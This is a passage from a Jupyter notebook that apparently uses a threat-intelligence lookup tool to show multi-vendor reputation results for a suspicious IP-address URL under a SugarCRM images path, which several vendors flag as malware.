bsp;&nbsp;&nbsp;&nbsp;'CSIS&nbsp;Security&nbsp;Group':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Certego':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Chong&nbsp;Lua&nbsp;Dao':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Cluster25':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Criminal&nbsp;IP':&nbsp;{'detected':&nbsp;True,&nbsp;'result':&nbsp;'malicious&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'CyRadar':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Cyan':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Cyble':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'DNS8':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Dr.Web':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'ESET':&nbsp;{'detected':&nbsp;True,&nbsp;'result':&nbsp;'malware&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'ESTsecurity':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'EmergingThreats':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Emsisoft':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Ermes':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Feodo&nbsp;Tracker':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Forcepoint&nbsp;ThreatSeeker':&nbsp;{'detected':&nbsp;False,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Fortinet':&nbsp;{'detected':&nbsp;True,&nbsp;'result':&nbsp;'malware&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'G-Data':&nbsp;{'detected':&nbsp;True,&nbsp;'result':&nbsp;'malware&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'GCP&nbsp;Abuse&nbsp;Intelligence':&nbsp;{'detected':&nbsp;False,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Google&nbsp;Safebrowsing':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'GreenSnow':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Gridinsoft':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Heimdal&nbsp;Security':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Hunt.io&nbsp;Intelligence':&nbsp;{'detected':&nbsp;False,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'IPsum':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Juniper&nbsp;Networks':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Kaspersky':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Lionic':&nbsp;{'detected':&nbsp;True,&nbsp;'result':&nbsp;'malware&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Lumu':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'MalwarePatrol':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'MalwareURL':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Malwared':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Netcraft':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'OpenPhish':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'PREBYTES':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'PhishFort':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'PhishLabs':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Phishing&nbsp;Database':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Phishtank':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'PrecisionSec':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Quick&nbsp;Heal':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Quttera':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Rising':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'SCUMWARE.org':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'SOCRadar':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'SafeToOpen':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Sangfor':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Sansec&nbsp;eComscan':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Scantitan':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Seclookup':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Snort&nbsp;IP&nbsp;sample&nbsp;list':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Sophos':&nbsp;{'detected':&nbsp;True,&nbsp;'result':&nbsp;'malware&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Spam404':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'StopForumSpam':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Sucuri&nbsp;SiteCheck':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'ThreatHive':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Threatsourcing':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Trustwave':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'URLQuery':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'URLhaus':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Underworld':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'VIPRE':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'VX&nbsp;Vault':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Viettel&nbsp;Threat&nbsp;Intelligence':&nbsp;{'detected':&nbsp;False,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'ViriBack':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Webroot':&nbsp;{'detected':&nbsp;True,&nbsp;'result':&nbsp;'malicious&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Xcitium&nbsp;Verdict&nbsp;Cloud':&nbsp;{'detected':&nbsp;False,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Yandex&nbsp;Safebrowsing':&nbsp;{'detail':&nbsp;'http://yandex.com/infected?l10n=en&url=http://85.214.149.236:443/sugarcrm/themes/default/images/',<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'detected':&nbsp;False,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'ZeroCERT':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'ZeroFox':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'alphaMountain.ai':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'benkow.cc':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'desenmascara.me':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'malwares.com&nbsp;URL&nbsp;checker':&nbsp;{'detected':&nbsp;False,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'securolytics':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'}},<br>&nbsp;'total':&nbsp;96,<br>&nbsp;'url':&nbsp;'http://85.214.149.236:443/sugarcrm/themes/default/images/',<br>&nbsp;'verbose_msg':&nbsp;'Scan&nbsp;finished,&nbsp;scan&nbsp;information&nbsp;embedded&nbsp;in&nbsp;this&nbsp;object'}</pre>\n",
       "        </details>\n",
       "        "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "TILookup.browse_results(Url.tilookup_url(\"http://85.214.149.236:443/sugarcrm/themes/default/images/\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba6998f3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
